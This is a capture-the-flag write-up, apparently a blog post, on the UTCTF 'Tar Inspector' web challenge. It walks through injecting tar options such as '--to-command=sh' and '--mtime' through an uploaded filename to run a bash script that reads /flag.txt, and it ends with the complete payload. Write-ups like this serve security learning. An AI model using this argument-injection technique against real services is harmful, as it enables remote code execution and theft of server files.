---
layout: post
author: Etch
title: "UTCTF: Tar Inspector"
date: 2021-03-14 15:24:00 -0500
categories: CTF-writeup
ctf-category: WEB
---




# Tar Inspector (WEB)

Tar inspector was a really neat challenge that showed how malicious filenames could allow remote code execution. I had really little knowledge of the subject,
but was able to work the challenge out bit by bit from just looking at the tar manual, and putting my input through a "local instance" of the challenge. 
<br/><br/>

    26 solves / 994 points
    

<br/>

# Initial Thoughts

This is what we see when we visit the website

![home](/assets/tarinspector/front_page.png)


It asks us to upload a file with a .tar extension. I tried other filetypes, and it did not accept them.
I uploaded a tar file with just a `test.txt` file in it, and when I submitted it, it showed me the tar file and its contents on the next page.


![test](/assets/tarinspector/test.png)

I was really clueless as to what to do, so I stepped away from the challenge.


A few hours later I looked at it again, but saw that the code for filtering the filename had been released.

```python
# creates a secured version of the filename
def secure_filename(filename):
    # strip extension and any sneaky path traversal stuff
    filename = filename[:-4]
    filename = os.path.basename(filename)
    # escape shell metacharacters
    filename = re.sub("(!|\$|#|&|\"|\'|\(|\)|\||<|>|`|\\\|;)", r"\\\1", filename)
    filename = re.sub("\n", "", filename)
    # add extension
    filename += '__'+hex(randrange(10000000))[2:]+'.tar'
    return filename
```

&nbsp;

Just from looking at it, I knew that the exploit involved the filename, which meant that I had to just abuse tar's options.
After doing a little research I came across examples where people used filenames to execute tar options. This challenge had become pretty straight forward.


&nbsp;


# The Process

I copied the filename code into a python file and added my own to test my inputs with tar.
I assumed that they were calling the command from python since they were checking the filename with it.

```python
import re
from random import randrange
import os
import sys


# creates a secured version of the filename
def secure_filename(filename):
    # strip extension and any sneaky path traversal stuff
    filename = filename[:-4]
    filename = os.path.basename(filename)
    # escape shell metacharacters
    filename = re.sub("(!|\$|#|&|\"|\'|\(|\)|\||<|>|`|\\\|;)", r"\\\1", filename)
    filename = re.sub("\n", "", filename)
    # add extension
    filename += '__'+hex(randrange(10000000))[2:]+'.tar'
    return filename


# tar -xvf file_name.tar

filename = sys.argv[1]
orig = filename
filename = secure_filename(filename)

print('File changed to new filename\n')
os.rename(orig,filename)

tar_string = 'tar -xvf %s' % (filename)
print(tar_string)
os.system(tar_string)
os.rename(filename,orig)
print('File change back to old name\n')
```

Here's what my code does
1. Send a tar file to the script
2. Pass the filename through the secure_filename filtering function
3. Rename the file to the secure filename
4. Untar it with the new name
5. Change the filename back to the original


&nbsp;




Now I could see exactly what happens when I upload my tar file to the site, including the errors that appeared.
Obviously I wasn't 100% sure if this is what was happening on the site, so I did some testing.
I compared the results of uploading to tar inspector versus sending it through my "local instance".
I tested five different filenames with different characters and checked whether they would throw errors or not. 
All five files uploaded when no errors appeared, and wouldn't when errors did appear. This testing let me trust my "local instance"


So I began testing to craft an exploit! 

## Crafting the exploit

Okay so now I knew I had to create a malicious filename containing tar options in it. That way when my file got passed, it would trick the system into running something malicious using the specified tar options.

I had read a few exploits about using `checkpoint-action=ACTION`, but after a tiny bit of tinkering with it, I decided to look for a better option

I did a bit more research and came across the `--to-command=COMMMAND` parameter, and saw it did exactly what I wanted!

![to_command](/assets/tarinspector/to_command.png)

```
└─▪ tar -xvf test.tar --to-command=cat test.txt
test.txt
this is the flag
```

Okay, now I know I have the ability to run binaries on the instance hosting tar inspector. Let's test it out with my "local instance"

I created a file with the name `test.tar --to-command=cat` and ran it through

```
└─▪ python3 function.py  test.tar\ --to-command\=cat 
File changed to new filename

tar -xvf test.tar --to-command__2e39bc.tar
tar: unrecognized option '--to-command__2e39bc.tar'
Try 'tar --help' or 'tar --usage' for more information.
File change back to old name
```

Oh yeah, they append a string onto the end. Let's change it to `test.tar --to-command=cat test.txt .tar`.
That way it will split up the end of the filename.


```
└─▪ python3 function.py test.tar\ --to-command\=cat\ test.txt\ .tar 
File changed to new filename

tar -xvf test.tar --to-command=cat test.txt __29eb5d.tar
tar: test.tar: Cannot open: No such file or directory
tar: Error is not recoverable: exiting now
File change back to old name

```

Hm, it says it cannot find test.tar. If we look at our input, it thinks that the filename is test.tar because there is a space after it. 
Let's add an * to the end of test so that it will look for any file starting with test, and call tar on it. 
This will allow tar to grab the whole file while keeping spaces in the name

`test* --to-command=cat test.txt .tar`

&nbsp;


### Important realizations

Also, at this point I realized cat wasn't going to work. 
The only thing the tar inspector shows is the filenames. 
So I had to either reverse shell in, or add the flag to my tar file.

I tried netcat, and got it to run without errors since the execution would pause while the netcat connection was running, bypassing whatever small errors were happening at the end of the tar input.
However, I asked the admin and he told me that netcat was not installed on their instance. Netcat wasn't going to work.

The only otion at this point was to add the flag to my own tar file through a bash script.

&nbsp;

Here was my initial bash script

`append.sh`
```
var=$( cat flag.txt )
touch $var
tar -rvf exploit* $var
```

Here's what it does
1. Stores the contents of flag.txt into a variable
2. Creates a file named the contents of flag.txt (which is the flag)
3. Adds this file to my own tar file. (The only file starting with exploit in their directory would be my tar file, so I pattern match the name)

&nbsp;

&nbsp;



**Okay, let's get back to crafting the exploit with our new train of thought**

&nbsp;



`exploit* --to-command=sh append.sh .tar`

Hopefully this will execute my bash script. Let's run it


```
└─▪ python3 function.py exploit\*\ --to-command\=sh\ append.sh\ .tar 
File changed to new filename

tar -xvf exploit* --to-command=sh append.sh __5786af.tar
append.sh
utctf{flag}
tar: __5786af.tar: Not found in archive
tar: Exiting with failure status due to previous errors
File change back to old name
```
It ran and added the flag to the tar file!

I tried uploading it at this point and learned that if any errors happened, it wouldn't go through the tar inspector.

The error is happening because it's trying to call on a file that doesn't exist (the string that gets appended)

Let's try matching the .tar extension and see if it will run even with an invalid file. I'll just add * before the .tar at the end

`exploit* --to-command=sh append.sh *.tar`

```
└─▪ python3 function.py exploit\*\ --to-command\=sh\ append.sh\ \*.tar 
File changed to new filename

tar -xvf exploit* --to-command=sh append.sh *__88a8c2.tar
append.sh
utctf{flag}
tar: Pattern matching characters used in file names
tar: Use --wildcards to enable pattern matching, or --no-wildcards to suppress this warning
tar: exploit* --to-command=sh append.sh *__88a8c2.tar: Not found in archive
tar: Exiting with failure status due to previous errors
File change back to old name
```

Okay it doesn't like pattern matching. It's also not finding the tar file name because it isn't in the archive, it's the archive's name.


I tried archiving the tar file in itself so it could be found, but tar doesn't let you do that.


Back to the tar manual to look for another tar option that will eat the ending input of `__random_string.tar`!


&nbsp;


![mtime](/assets/tarinspector/mtime.png)

Perfect. Since the format is abitrary, I assume I can put whatever the heck I want and it'll work without an error.
I'll change my filename to ```exploit* --to-command=sh append.sh --mtime=*.tar``` and give it a run.

```
└─▪ python3 function.py exploit\*\ --to-command\=sh\ append.sh\ --mtime\=\*.tar 
File changed to new filename

tar -xvf exploit* --to-command=sh append.sh --mtime=*__1ee087.tar
tar: Substituting -9223372036854775807 for unknown date format ‘*__1ee087.tar’
append.sh
utctf{flag}
File change back to old name
```

A flawless run! The mtime didn't work entirely as expected, but it still got the job done.

Let's upload this thing and get the flag!

![fail](/assets/tarinspector/fail.png)

*What the heck!*

 At this point I knew for a fact that my exploit worked and I should be getting the flag. 
I decided to double check the hint of where the flag was. 

![hint](/assets/tarinspector/hint.png)

After all this testing my brain thought that /flag.txt meant the current directory, and about a minute I realized that it was the root directory...


I changed the location to /flag.txt, sent my malicious tar file, and there was the flag!

![flag](/assets/tarinspector/flag.png)

utflag{bl1nd_c0mmand_1nj3ct10n?_n1c3_w0rk}



**NOTE:** When I went back and did this writeup, my exploit wasn't working! Why? 
When you upload the tar file, it actually gets uploaded! If you try to upload another file with the same name, it will error out because it already exists.
You have to change the filename on each run for it to actually work.

&nbsp;

tl;dr 

&nbsp;

Filename of tar archive
```
exploit* --to-command=sh append.sh --mtime=*.tar
```


Script inside of the tar archive

```
var=$( cat /flag.txt )
touch $var
tar -rvf exploit* $var
```